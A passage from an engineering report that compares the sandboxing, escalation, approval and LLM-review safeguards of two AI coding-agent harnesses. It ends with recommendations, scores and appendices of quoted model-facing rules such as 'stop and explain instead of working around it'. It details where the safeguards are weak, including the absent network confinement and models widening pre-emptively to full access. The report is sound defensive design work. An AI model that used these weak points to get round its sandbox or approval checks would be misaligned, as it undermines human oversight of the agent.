          → ctx.approval.request(...) → HUMAN PROMPT
          → allowed-once ⇒ runs unconfined, THIS CALL ONLY
```
`[V]` — `tool-bash/src/index.ts:226-253`, `:393-405`; `bash-sandbox/src/index.ts:115-133`; `sandbox/src/escalation.ts:171-207`; `render.ts` denial markers.

Properties:
- **Not automatic.** The harness never retries. The model must (a) notice the marker, (b) construct a second call with two extra arguments, and (c) choose the *narrowest wider* mode. `[V]`
- **Strictly-wider is enforced at execution**, so a model cannot "escalate" laterally (the `WIDER_MODES` membership check at `escalation.ts:174-179`). `[V]`
- **Runner failure ≠ denial.** A runner that never started the command throws `SandboxUnavailableError` and is deliberately *not* treated as a denial, so the model is not nudged into an escalation that would not help (`bash-sandbox/src/index.ts:118-123`, `:158-173`; the model sees `"[sandbox: the sandbox runner itself failed under <mode> mode — the command did not run; this is a sandbox problem, not a command failure]"`, `render.ts` `renderJobRead`). `[V]` — this is a genuinely thoughtful distinction.
- **Cost**: one wasted model turn per denied command, plus one prompt per denied command, with no memory across them. `[V]`
- **Alternative recovery**: none. There is no `OnFailure` policy that auto-escalates, and no intermediate permission widening. `[V]`

### CODEX — **harness-driven, one turn, in-band**

```
turn N:   shell("npm install -g foo")
          attempt 1: SandboxType::MacosSeatbelt | LinuxSeccomp | WindowsRestrictedToken
          → is_likely_sandbox_denied(SandboxType, output) — denial.rs:13-42
             (skips exit 0; skips executor-managed; skips exit {2,126,127};
              treats 128+SIGSYS as a seccomp denial)
          → SandboxErr::Denied { output } — orchestrator.rs:318-321
          → escalate_on_failure()? — sandboxing.rs:344-346 (default true)
          → wants_no_sandbox_approval(approval_policy)? — orchestrator.rs:365
          → unsandboxed_execution_allowed(fs_policy)? (false if denied-reads exist)
            — sandboxing.rs:275-279, orchestrator.rs:387
          → PROMPT IN-BAND: "<denial reason> — retry without sandbox?"
            reason string: "command failed; retry without sandbox?"
            — orchestrator.rs:404, :542-546
          attempt 2: SandboxType::None, same turn, immediately
          → "escalated" telemetry — orchestrator.rs:486-498
```
`[V]` — `core/src/tools/orchestrator.rs:170-513`, `core/src/tools/sandboxing.rs:238-306`, `sandboxing/src/denial.rs:13-72`.

Properties that DSH lacks:
- **Automatic retry inside the same turn.** The model does not re-issue anything; it just gets the command's real output. `[V]`
- **Escalation re-prompts only when it must.** `bypass_retry_approval = !strict_auto_review && should_bypass_approval(policy, already_approved) && network_approval_context.is_none()` — under `Never`, or when the first attempt was already approved, the retry happens with no second prompt (`orchestrator.rs:409-411`, `sandboxing.rs:315-321`). `[V]`
- **Denied-read safety.** If the active filesystem policy contains denied-read paths, escalation is *refused* (`unsandboxed_execution_allowed` false), because running unsandboxed would silently grant those reads; `sandbox_permissions_preserving_denied_reads` downgrades `RequireEscalated` to `UseDefault` in that case (`sandboxing.rs:269-295`). This is careful reasoning DSH has no analogue for (DSH has no denied reads at all). `[V]`
- **Two-way policy rejections.** `prompt_is_rejected_by_policy` returns typed reasons distinguishing "no prompts allowed at all" (`PROMPT_CONFLICT_REASON`), "granular sandbox approval off" (`REJECT_SANDBOX_APPROVAL_REASON`), and "granular rule approval off" (`REJECT_RULES_APPROVAL_REASON`) — `core/src/exec_policy.rs:47-52`, `:216-238`. `[V]`
- **Network denials route through the same loop** with `retry_reason = "Network access to \"<host>\" is blocked by policy."` (`orchestrator.rs:397-405`). `[V]`

**Verdict:** DSH requires user interaction *and* an extra model turn per recovery; Codex requires user interaction but no extra turn, and can skip the interaction entirely on a repeat. For a session with K sandbox denials, DSH costs ~K prompts + K turns; Codex costs ~1 prompt + 0 turns (with prefix persistence).

---

## 6. DSH guard/hooks items that are genuinely ahead of Codex

I looked for real advantages rather than surface novelty. Five hold up; two do not.

### Ahead — verified

1. **`repeat-tool-reminder` — an advisory loop detector with a graduated ladder.**
   `packages/guard/repeat-tool-reminder/src/index.ts`. Consecutive-repeat thresholds default `[3, 5, 8]` (`:53`); the first threshold emits a gentle reminder (`:70-74`), later thresholds emit a detailed one naming the tool, the run length, and a **capped preview** of the canonical arguments (`:77-86`, cap default 500 chars at `:56` / `:49`). Arguments are canonicalized by deep key-sort before comparison (`:96-112`), tool selection uses `*`-wildcard include/exclude predicates (`:114-118`, `:183-186`), and the listener **observes and enriches but never vetoes** — it calls `next()` first so a downstream blocker still wins, then folds the reminder onto the decision (`:220-231`). It counts *denied* calls too, deliberately, because "a model hammering a denied call is exactly the loop worth breaking" (`:188-195`), and resets the chain on a user interjection (`:236-239`).
   **Codex has no equivalent.** A grep across `codex-rs/core/src/tools/` for a repeat/loop detector found nothing. Codex has compaction, token budgets, and (per the guardian) an LLM reviewer for risky actions — but no cheap, deterministic "you have made this exact call 5 times" signal. This is a real, low-cost, high-value guard. `[V]` for DSH; `[V]`-by-absence for Codex.

2. **`timeout-policy` — a cooperative deadline at the tool-execution seam with a structured error code.**
   `packages/guard/timeout-policy/src/index.ts`. Wraps `tools/execute`; reads the tool's declared `timeoutMs` (`:57`); arms a `deadline(exec.signal, timeoutMs, TOOL_TIMEOUT)` (`:61`); **swaps the derived signal onto `exec`** for dispatch and restores the upstream signal in `finally` so post-execute listeners never observe this plugin's aborted signal (`:63-79`); and only substitutes its result when **its own** timer fired, scoped by code so a nested outer deadline reads as an ordinary upstream cancel (`:20-24`, `:73-75`). The substituted result carries `{ name: 'ToolTimeoutError', code: 'TOOL_TIMEOUT' }` so retry/sandbox plugins and replay can route on it (`:33-48`). `[V]`
   Codex has per-command timeouts and `SandboxErr::Timeout`, but not a *policy plugin keyed off a tool-declared budget* with a reusable structured code. The design of "the tool promises to honor `exec.signal`; the guard enforces the promise without racing or abandoning it" (`:1-4`) is cleaner than a hard kill. `[V]`

3. **A durable, turn-enclosed approval audit pair.**
   `ApprovalService.request` appends `approval/asked` before dispatching and `approval/decided` after, with a **precondition that the session is inside an open turn** — because "the turn is the durable log's commit/replay boundary, so a bare event appended between turns is indistinguishable from a crash tail and silently dropped on reload" (`interaction/user-approval/src/index.ts:77-92`, `:215-234`). A rogue non-vocabulary answerer return is normalized to the fail-closed `'unavailable'` (`:286-292`); a throwing answerer "must fail the QUESTION closed, not the caller's tool call open" (`:289-291`); the `'never'` policy is decided *inside the service's own request path* precisely so that a later-mounted `prepend: true` listener cannot bypass it (`:270-275`). `[V]`
   Codex emits rollout/telemetry events for approvals (e.g. `codex.approval.requested`, `sandboxing.rs:99-106`) with an opaque-string PII-scrubbing path (`protocol.rs:4055-4073`), but does not enforce a turn-enclosure invariant on the audit pair. DSH's guarantee is stronger. `[V]`

4. **A closed, strictly-wider escalation vocabulary with mandatory justification pairing.**
   `WIDER_MODES` is a total table, not a comparison (`escalation.ts:28-31`); the check is at execution against the call's *effective* mode, with an explicit comment on why it is deliberately not a schema constraint (`:174-179`); `sandbox_permissions` and `justification` must travel together and the justification must be a non-empty sentence (`:51-61`); the schema enum is the closed target vocabulary `ESCALATION_TARGETS` (`:33-41`); and the "repeating the effective mode needs no approval" short-circuit avoids a pointless prompt (`:173`). Codex's `SandboxPermissions` is a flat 3-variant enum (`UseDefault`/`RequireEscalated`/`WithAdditionalPermissions`, `protocol.rs`/`models.rs:54-63`) with no strictly-wider invariant and no argument-pairing rule. `[V]`

5. **Fail-closed by construction, with an honesty field.**
   `SandboxProvider.confine` is documented as "must return enforcing argv or fail closed at wrap or runner-execution time; silent unconfined passthrough is forbidden" (`sandbox/src/index.ts:153-158`), backed by `SandboxUnavailableError` with the code `SANDBOX_UNAVAILABLE` (`:125-145`) and a deliberately instructive message that lists the per-platform remedy (`:135-140`). `SandboxEnforcement = 'full' | 'partial'` is carried on every `ConfinedArgv` (`:60`, `:99-100`) and the Windows rung honestly declares `'partial'` for its documented hard-link / unconfined-read / AppContainer-ACL boundaries (`sandbox-local/src/index.ts:178-189`).
   The `full|partial` field is the piece Codex lacks: Codex's `SandboxType` has no completeness dimension (`sandboxing/src/manager.rs:37-42`), so a downgrade is invisible to the caller unless it throws — which the legacy-Landlock path does (`linux-sandbox/src/landlock.rs:71-77`), but the Windows restricted-token path does not. `[V]`

6. **Shared writable-root derivation between the OS runner and the in-process fence.**
   `writableRoots()` is the single source of truth (`sandbox/src/index.ts:22` re-export; `roots.ts:52-55`), and `seatbeltProfileArgs` explicitly consumes it so the Seatbelt grant and `dsh-fs-sandbox`'s containment check "can never drift apart" (`sandbox-local/src/profiles.ts:43-56`; `roots.ts:1-13`). Canonicalization uses `realpathSync.native` with a documented reason (Node's JS realpath lexically collapses `..` before resolving a preceding symlink — `roots.ts:31-41`). This is a genuine class of bug designed out. `[V]`

7. **Transitive sandboxing of hook commands.**
   The hook runner executes every hook through `ctx.shell` (`hook-protocol/src/runner.ts:2`, `:68`, `:87`), and the RFC confirms "OS subprocesses through `ctx.shell` — the bash tools, and hook commands transitively" (`.agents/notes/implemented/feature/2026-07-06-sandbox.md:197`). So a hook cannot be an escape hatch around the sandbox. `[V]`

### Not ahead — verified or likely-neutral

- **The `deny > ask > allow` hook merge** (`hook-protocol/src/merge.ts:3`, `:34-49`) is nice, but Codex's own hooks crate already has `PreToolUsePermissionDecisionWire::{Allow, Deny, Ask}` (`codex-rs/hooks/src/schema.rs:223-263`), so DSH is *mirroring* Codex here, not leading. DSH's advantage is supporting **both** dialects in one normalized protocol with a documented precedence fold and a per-invocation audit pair (`hook/invoked` + `hook/result`, `hook-protocol/src/types.ts:8-40`). That is a modest win. `[V]`
- **The auto-review LLM gate** (`packages/experimental/auto-review/src/index.ts`) is explicitly experimental, current-session-only, and registered as the fixed `auto` preset with `{sandbox: 'danger-full-access', approval: 'ask'}` (`permission-presets/src/index.ts:89-92`) — i.e. it is an LLM reviewer standing in for the sandbox. Codex's guardian is a more developed, differently-scoped system (see §7). Not ahead. `[V]`

---

## 7. Adjacent comparison — LLM reviewers (auto-review vs guardian)

Worth recording because both harnesses independently arrived at "put a model in the approval path".

| | DSH `experimental/auto-review` | CODEX `core/src/guardian` |
|---|---|---|
| Trigger | Every native call and every started PTC inner call, once, before its body; the outer `run_code` transport deliberately excluded (`auto-review/src/index.ts:1-4`) | `ApprovalContext { strict_auto_review }` set from step settings; invoked on `Skip` (strict review) and on every `NeedsApproval` (`orchestrator.rs:175-195`, `:214-228`) |
| Output contract | Exactly one JSON object from six valid shapes over `{risk: low\|medium\|high, decision: allow\|deny, reason?}`; `low`+`deny`, `high`+`allow`, and `reason`+`allow` are all invalid (`auto-review/src/index.ts:35-42`) | `GuardianAssessmentOutcome::{Allow, Deny}` (`protocol/src/approvals.rs:105-111`) with `GuardianRiskLevel::{Low, Medium, High, Critical}` (`:87-94`) and `GuardianUserAuthorization::{Unknown, Low, Medium, High}` (`:96-103`) |
| Risk taxonomy | 3 classes: project-local work; irreversible/prod/security changes; sensitive exfiltration (`:44-47`) | ~65-line policy covering Data Exfiltration, Credential Probing, Persistent Security Weakening, Destructive Actions, with explicit outcome rules per class (`guardian/policy.md:1-65`) |
| Fail-closed direction | "Fail closed when actual effects are ambiguous or broader than established scope"; no instruction can downgrade a risk class or authorize a `high` action (`:49`, `:47`) | "deny any action or network request which exposes sensitive data where the user has not authorized exposing that specific data to the specific destination" (`policy.md:26`) |
| Interaction with human approval | Reviewer denial under `ask` → asks the *user* (`:2-3`) | `GuardianAssessmentStatus::{InProgress, Approved, Denied, TimedOut, Aborted}`; denial is a first-class outcome; a separate `ApproveGuardianDeniedAction` submission exists for human override (`protocol.rs:940`) |
| Scope | Tool calls only | Commands, execve, write-stdin, apply_patch, **network access**, MCP tool calls, permission requests (`GuardianAssessmentAction`, `approvals.rs:139-180`) |

**Assessment:** Codex's guardian is broader (7 action kinds vs 1), has a far richer written policy, and is wired into the network-approval path. DSH's is a smaller, self-contained, clearly-labeled experiment. Codex ahead. `[V]`

---

## 8. Prioritized recommendations

Effort scale: **L** = hours, **M** = a day or two, **H** = a week+.

---

### R1 — Add a network dimension to the sandbox vocabulary and enforce it in every backend

**Impact: H · Effort: H**
**Files to touch:**
- `packages/sandbox/sandbox/src/index.ts` — extend `SandboxMode` or (better) add an orthogonal `NetworkMode = 'off' | 'proxied' | 'open'` to `SandboxExecutionPolicy` (`:40-53`) and `SandboxPolicy` (`:70-73`); update the doc comment at `:24-30`.
- `packages/sandbox/sandbox-local/src/profiles.ts` — `bwrapProfileArgs` (`:16-23`) gains `--unshare-net` when off (and, if proxied, a loopback bridge); `seatbeltProfileArgs` (`:51-58`) must stop relying on `(allow default)` and instead emit `(deny default)` + an explicit allow-list, or at minimum `(deny network*)` with loopback exceptions; `landlockProfileArgs` (`:30-36`) needs the ABI-v4+ network ruleset or a documented `unusable` verdict for `off`.
- `packages/sandbox/sandbox-windows-acl/src/runner.ts` and `acl.ts` — WFP or `INetFwRule` equivalent scoped to the restricted token's SID.
- `packages/sandbox/sandbox-policy/src/index.ts` — `resolve()` (`:164-171`) and `renderPolicyContext()` (`:42-56`) must carry and narrate the network dimension.
- `packages/bundle/base/cordis.patch.yml` — presets at `:254-261` gain the network knob.
- `packages/sandbox/sandbox-local/src/index.ts` — `DENIAL_SIGNATURES` (`:207-215`) needs network-denial dialects (`ENETUNREACH`, `EPERM` on `connect`, "Operation not permitted" from seatbelt).

**Rationale:** This is the only finding on this axis that constitutes an actual security hole rather than a UX or capability difference. The RFC already names the exact mechanism (`2026-07-14-cross-family-fs-sandbox.md:56`: "bwrap `--unshare-net`, Landlock ABI v4+"), so the design work is largely done. Ship it as a separate knob rather than folding it into `SandboxMode` — the RFC's own reasoning (`2026-07-06-sandbox.md:59`) is that a mode that silently means two different things is worse than two modes.

---

### R2 — Make sandbox escalation recoverable in one turn (harness-driven retry)

**Impact: H · Effort: M**
**Files to touch:**
- `packages/shell/tool-bash/src/index.ts` (`:226-253`, and the execute path around `:280-360`) and `packages/shell/tool-pwsh/src/index.ts` (`:256`) — on a classified denial, instead of returning the marker and waiting for the model, run the approval flow and retry the **same** command once under the granted mode.
- `packages/shell/bash-sandbox/src/index.ts` — `execute()` (`:89-133`) already produces `result.sandbox.denied` plus `enforcement`; expose enough for the tool layer to make the retry decision without re-deriving it.
- `packages/sandbox/sandbox/src/escalation.ts` — `approveEscalation` (`:171-207`) already has the fail-closed sequencing; it needs a call site that is *not* driven by a model-supplied argument, plus a policy switch deciding whether auto-retry is allowed.
- `packages/core/tools/src/index.ts` — if the retry is generalized beyond bash, the `tools/post-execute` seam (`:1780+`) is the natural home; otherwise keep it in the tool.

**Rationale:** Today a denial costs one extra model turn *and* one prompt, per denial (`render.ts` hint marker + `tool-bash/src/index.ts:393-405`). Codex does this in-turn (`orchestrator.rs:317-513`) for one prompt. This is the highest-ratio UX win available: no new security surface (the approval still gates it), pure latency/token saving.

**Measured 2026-10-03, and the premise does not hold.** `node tools/escalation-census.mjs` over the whole corpus finds **1 sandbox denial in 18,660 tool calls** across 75 sessions, and that one was answered in the *same* turn, one step later — not a turn later. The denied result already carries `[sandbox: escalation available — retry this exact command once with sandbox_permissions ...]`, so the recovery was guided, not guessed. On this evidence the item was dropped rather than built.

The same run also disqualifies the obvious implementation: of 173 escalation asks, 11 followed a raw `EPERM: operation not permitted` and only **1** produced the `[sandbox: file access denied under <mode> mode]` marker that `sandboxDenialMarker` emits and a plugin can read — the marker finds roughly one refusal in twelve. And the retry has no seam a plugin may use: `tools/execute` is the one re-callable wrapper point, but its README says wrappers "may replace only the operational signal" and `ToolDispatchExecution` leaves `arguments` readonly, so re-dispatching with escalation fields is off-contract. What the corpus does show is 172 of 173 asks made **before** any denial — models widening pre-emptively to `danger-full-access`, 148 `bash` / 24 `edit` / 1 `write` — which is the approval-friction problem R3 addresses, not this one.

---

### R3 — Approval memory: session-scoped and command-prefix grants

**Impact: H · Effort: M**
**Files to touch:**
- `packages/interaction/user-approval/src/types.ts` — widen `ApprovalOutcome` (`:32`) beyond `'allowed-once' | …` to include a scoped grant (e.g. `'allowed-for-session' | 'allowed-prefix'`), or add a parallel `ApprovalGrant` record.
- `packages/interaction/user-approval/src/index.ts` — `decide()` (`:267-307`) consults the grant store before dispatching; `request()` (`:215-234`) persists grants as durable session events so replay reconstructs them (mirroring the existing `approval/policy` fold pattern at `:100-105`, `:252-259`).
- `packages/sandbox/sandbox/src/escalation.ts` — `approveEscalation` (`:173`) currently short-circuits only on mode equality; add a grant lookup keyed on `(toolName, command prefix, targetMode)`.
- `packages/shell/tool-bash/src/index.ts` — surface the new options in the approval request; the `bash` tool already has the `command` string in hand.

**Rationale:** The one-shot grant (`types.ts:32`) means prompt count grows linearly with denied-command count. Codex's `ApprovalStore` + prefix rules make it sub-linear (`tools/sandboxing.rs:70-116`; `exec_policy.rs:447-470`). This is the difference between "DSH prompts 6 times for a 6-step install" and "once".

**Built in the plugin shape, 2026-10-03.** [`../../packages/dsh-approval-memory`](../../packages/dsh-approval-memory) answers the `approval/request` waterfall - registered with `prepend`, so it is consulted before the deployment's own answerer - from a rules file of command prefixes, reading the pending call's arguments from the session log by `callId`. That delivers the user-visible half of this recommendation without an upstream change: a prefix granted once stops asking. It does **not** deliver the rest of R3 - no `ApprovalGrant` record, no durable grant event, no `(toolName, prefix, targetMode)` keying, no deny rules - and it cannot land the files listed above, since this repository takes no upstream pull requests. Rules live under `~/.dsh`, outside every session workspace, because a rule file the agent can write is a grant the agent can give itself. Verified live on 2026-10-03: a rule-covered `bash` escalation was answered in 0 ms with no dialog, a command carrying `&&` was refused and asked (2998 ms), and a rule-less tool was delegated (2422 ms).

---

### R4 — Add an intermediate widening rung (per-call additional roots / network)

**Impact: M · Effort: M**
**Files to touch:**
- `packages/sandbox/sandbox/src/index.ts` — `SandboxPolicy` (`:70-73`) gains optional `additionalWritableRoots: readonly string[]` (and, once R1 lands, `additionalNetwork: …`).
- `packages/sandbox/sandbox/src/escalation.ts` — `WIDER_MODES` (`:28-31`) becomes a predicate over `(effective, requested)` rather than a table over two enums, since "same mode + one more root" is a strict widening the current table cannot express.
- `packages/sandbox/sandbox-local/src/profiles.ts` — `bwrapProfileArgs` `:18-21` and `landlockProfileArgs` `:31-34` already take a root list; thread the additional roots through.
- `packages/shell/tool-bash/src/index.ts` — schema at `:395-405`.

**Rationale:** Today the only widening from `workspace-write` is `danger-full-access` (`escalation.ts:30`). Asking a user to disable the entire filesystem sandbox so a test can write `/var/tmp` is a bad question. Codex asks it as `with_additional_permissions { file_system.write: ["/var/tmp"] }` (`prompts/.../on_request_rule_request_permission.md:5-16`).

---

### R5 — Command policy language (or at least a bounded allowlist)

**Impact: M · Effort: H**
**Files to touch:**
- New package, e.g. `packages/guard/command-policy/` (the `guard/` group is the right home per `packages/guard/README.md:5-8`).
- Integration point: `tools/pre-execute` waterfall (`packages/core/tools/src/index.ts:146-153`, decision type at `:607-611`) — return `{kind:'deny'|'ask'|'allow'}` exactly as the hook bridge already does (`hooks-claude-code/src/index.ts:247-248`).
- Reuse the existing matcher/merge machinery (`packages/hooks/hook-protocol/src/{matcher,merge}.ts`) rather than inventing a second one.

**Rationale:** DSH's nearest existing capability is "spawn an external program per tool call and parse its JSON" (`hook-protocol/src/runner.ts:87`). That works but is heavyweight, has no in-tree rule files, no `match`/`not_match` load-time validation, no `forbidden` verdict distinct from `deny`, and — critically — no **persistence path** for a user's "don't ask again" answer (R3 needs somewhere to write). A prefix rule file in `$DSH_HOME/rules/*.rules` would close the loop. **Note the honest counter-argument**: DSH's `deny > ask > allow` hook merge plus `approval/asked` auditing is ~70% of the value at ~10% of the cost, so this is the lowest-priority item on this list, and it should be gated on R3 proving that users actually want persistent grants.

---

### R6 — Narrate the network reality in user-facing preset descriptions

**Impact: M · Effort: L**
**Files to touch:**
- `packages/interaction/permission-presets/src/index.ts:189-197` — the two shipped `description` strings.
- `packages/sandbox/sandbox-policy/src/index.ts:42-56` — `renderPolicyContext` (the model already gets a truthful sentence at `:45`; keep that, and align the human text).
- `packages/sandbox/sandbox/README.md:167`, `packages/sandbox/sandbox-windows-acl/README.md:125` — already honest; no change needed, but cross-link from the preset docs.

**Rationale:** Cheap, and it removes the "read-only sounds like no-egress" trap until R1 lands. The current `workspace-write` description ("Write inside the workspace and permitted temporary directories; wider retries require approval." — `:191`) says nothing about network, reads, or that reads are unrestricted.

---

### R7 — Enforce a probe on sole-candidate platform chains (defence in depth)

**Impact: L · Effort: L**
**Files to touch:**
- `packages/sandbox/sandbox-local/src/index.ts:509-521` (`chainVerdict`) — currently a sole candidate is selected **without probing** (`:514-515`), so on darwin a missing/broken `sandbox-exec` is only discovered at first execution, where it fails closed but *after* the user has already issued a command.

**Rationale:** Purely a latency/UX nicety — the fail-closed property is preserved either way (`:505`). Low priority. The existing comment explaining the choice ("probing arbitrates; it does not re-validate a choice that has no alternative", `:151-158`) is defensible; I flag it only because probing once at provider construction would surface a broken host before the first command.

---

### R8 — Do not build (explicit non-recommendations)

- **Do not copy Codex's `untrusted` policy.** It prompts for every non-rule-matched command (`exec_policy.rs:779-783`) and, at DSH's current prompt granularity, would be pure friction with no compensating boundary. It only becomes useful *after* R5.
- **Do not port the guardian yet.** DSH's `auto-review` already covers the tool-call case (`experimental/auto-review/src/index.ts`), its scoping is honest (current-session-only, `danger-full-access` preset, `permission-presets/src/index.ts:89-92`), and Codex's breadth (network, MCP, apply_patch, write-stdin) is mostly a function of Codex having those action kinds at all. Extend DSH's reviewer only when R1 gives it a network action to review.
- **Do not add a `partial`-downgrade escape hatch.** DSH's `SandboxUnavailableError` hard-refusal (`sandbox/src/index.ts:132-145`) is genuinely better than Codex's silent `SandboxType::None` fallback on unsupported hosts (`manager.rs:62-76`). Keep it.

---

## 9. Scored summary

| Sub-axis | Winner | Margin | One-line reason |
|---|---|---|---|
| Filesystem enforcement breadth | **Codex** | Large | Deny-by-default Seatbelt, `--cap-drop ALL` + unreadable-glob masking, OS-account Windows isolation, read *and* write policy. |
| Filesystem enforcement honesty | **DSH** | Moderate | `full\|partial` enforcement field + hard `SANDBOX_UNAVAILABLE` refusal vs. a silent `SandboxType::None`. |
| Network control | **Codex** | Decisive | Three OS-level mechanisms + allowlist MITM proxy + per-host approval. DSH: nothing, by explicit design. |
| Command policy language | **Codex** | Decisive | Starlark `prefix_rule`/`network_rule`/`host_executable`, `allow\|prompt\|forbidden`, load-time example validation, layered rule dirs, persistence. DSH: none. |
| Approval UX (prompt volume) | **Codex** | Large | Prefix + session caching makes prompt count sub-linear; DSH's grants are one-shot. |
| Approval UX (prompt quality) | **Codex** | Moderate | Richer decision set (persist/session/prefix/host) but terser reason text; DSH's mandatory justification + in-band escalation hint are better *per prompt*. |
| Escalation recovery | **Codex** | Large | Automatic same-turn retry; DSH needs a model turn + a prompt every time. |
| Fail-closed escalation ethics | **DSH** | Slight | Closed strictly-wider ladder, mandatory justification pairing, denial≠runner-failure distinction. |
| Auditability | **DSH** | Slight | Turn-enclosed durable `approval/asked`+`approval/decided` pair with a stated invariant. |
| Loop hygiene guards | **DSH** | Moderate | `repeat-tool-reminder` and cooperative `timeout-policy` have no Codex counterpart. |
| Risky-action LLM review | **Codex** | Moderate | Guardian covers 7 action kinds with a 65-line written policy; DSH's auto-review covers tool calls only and is experimental. |
| **Overall** | **CODEX** | **Large** | DSH is a well-engineered *integrity* sandbox with excellent fail-closed manners and no network story. Codex is a policy engine with an OS boundary on all three platforms. |

---

## Appendix A — Exact strings worth quoting

**DSH**

| Context | String | Source |
|---|---|---|
| Model-facing mode narration | `Current DSH file policy: workspace-write. Any available operation enforced by the DSH file sandbox may modify files under the session workspace: "<root>". Some platform temporary areas may also be writable.` | `sandbox-policy/src/index.ts:47` |
| `never` policy narration | `Approval prompts are disabled in this session: actions that require approval are rejected automatically — do not request sandbox escalation (do not set \`sandbox_permissions\`).` | `user-approval/src/index.ts:73` |
| Denial marker | `[sandbox: file access denied under <mode> mode]` | `sandbox/src/escalation.ts:72` |
| Escalation hint | `[sandbox: escalation available — retry this exact <subject> once with sandbox_permissions (the narrowest wider mode that suffices) + justification; the approval prompt asks the user]` | `sandbox/src/escalation.ts:85` |
| Approval prompt | `Allow this operation with <mode> permissions: <justification>` | `sandbox/src/escalation.ts:194` |
| Rejection feedback | `the user rejected escalating this command to "<mode>"; it stays denied, so stop and explain instead of working around it` | `sandbox/src/escalation.ts:203` |
| Fail-closed error | `sandbox mode "<mode>" is requested but no sandbox backend is usable on this host; refusing to run the command unconfined. Install bubblewrap or run a Landlock-enforcing kernel (Linux), ensure sandbox-exec is usable (macOS), or ensure the ACL restricted-token runner can start (Windows) — otherwise switch the consumer to danger-full-access.` | `sandbox/src/index.ts:135-140` |
| Runner-failure notice | `[sandbox: the sandbox runner itself failed under <mode> mode — the command did not run; this is a sandbox problem, not a command failure]` | `tool-bash/src/render.ts` (`renderJobRead`) |
| Repeat reminder (gentle) | `You are repeating the exact same tool call with identical arguments. Carefully analyze the previous result before calling again: …` | `guard/repeat-tool-reminder/src/index.ts:70-74` |

**CODEX**

| Context | String | Source |
|---|---|---|
| Escalation retry reason | `command failed; retry without sandbox?` | `core/src/tools/orchestrator.rs:545` |
| Network prompt reason | `<host> is not in the allowed_domains` | `core/src/tools/network_approval.rs:649` |
| Network denial message | `Network access to "<target>" was blocked by policy.` | `core/src/tools/network_approval.rs:648` |
| Prompt conflict (Never) | `approval required by policy, but AskForApproval is set to Never` | `core/src/exec_policy.rs:47-48` |
| Granular sandbox off | `approval required by policy, but AskForApproval::Granular.sandbox_approval is false` | `core/src/exec_policy.rs:49-50` |
| Granular rules off | `approval required by policy rule, but AskForApproval::Granular.rules is false` | `core/src/exec_policy.rs:51-52` |
| TUI approve | `Yes, proceed` | `tui/src/bottom_pane/approval_overlay.rs:842` |
| TUI approve + persist | ``Yes, and don't ask again for commands that start with `<prefix>` `` | `tui/src/bottom_pane/approval_overlay.rs:857` |
| TUI approve for session | `Yes, and don't ask again for this command in this session` | `tui/src/bottom_pane/approval_overlay.rs:873` |
| TUI allow host | `Yes, and allow this host in the future` | `tui/src/bottom_pane/approval_overlay.rs:885` |
| TUI deny + persist | `No, and block this host in the future` | `tui/src/bottom_pane/approval_overlay.rs:889` |
| TUI abort | `No, and tell Codex what to do differently` | `tui/src/bottom_pane/approval_overlay.rs:909` |
| Approval-policy prompt template (`never`) | `Approval policy is currently never. Do not provide the \`sandbox_permissions\` for any reason, commands will be rejected.` | `prompts/templates/permissions/approval_policy/never.md:1` |
| Escalation instruction to model | `If you run a command that is important to solving the user's query, but it fails because of sandboxing … rerun the command with "require_escalated". ALWAYS proceed to use the \`justification\` parameter - do not message the user before requesting approval for the command.` | `prompts/templates/permissions/approval_policy/on_request.md:28` |

---

## Appendix B — Searches that returned nothing (negative evidence)

| Search | Scope | Result |
|---|---|---|
| `unshare-net`, `deny network`, `network_access`, `networkAccess` | DSH `packages/**/*.ts` | 0 hits `[V]` |
| `execpolicy`, `starlark` (as an implementation) | DSH `packages/**/*.ts` | 0 relevant hits `[V]` |
| `is_known_safe_command` / `known_safe` / `safe_command` | CODEX `codex-rs/**/*.rs` (non-test) | 0 hits — the safe-command notion is now expressed via execpolicy rules + `render_decision_for_unmatched_command`, not a hardcoded list `[V]` |
| `*.rules` / `default.rules` shipped in repo | CODEX | 0 files — `default.rules` is created under `$CODEX_HOME/rules/` on the first persisted approval (`exec_policy.rs:831-833`, `:461-470`) `[V]` |
| Repeat/loop-detector | CODEX `core/src/tools/**` | 0 hits `[V]` |
| `AppContainer` | CODEX `windows-sandbox-rs/**` | 0 hits — Codex uses restricted tokens + provisioned sandbox users, not AppContainer `[V]` |

---

*End of report.*
